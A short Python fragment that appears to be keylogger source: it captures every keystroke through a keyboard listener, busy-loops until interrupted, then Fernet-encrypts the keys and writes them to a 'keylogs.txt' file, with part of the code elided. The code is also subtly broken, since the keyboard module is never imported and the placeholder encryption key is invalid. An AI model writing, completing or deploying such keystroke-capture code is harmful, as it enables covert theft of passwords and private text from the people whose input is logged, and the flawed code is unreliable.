from cryptography.fernet import Fernet

# ... (rest of the code)

key_strokes = []

def on_press(key):
    key_strokes.append(key)

listener = keyboard.Listener(on_press=on_press)
listener.start()

try:
    while True:
        pass
except KeyboardInterrupt:
    pass

listener.stop()

fernet = Fernet(b'your_secret_key')

with open('keylogs.txt', 'w') as f:
    for key in key_strokes:
        encrypted_key = fernet.encrypt(str(key).encode())
        f.write(encrypted_key.decode())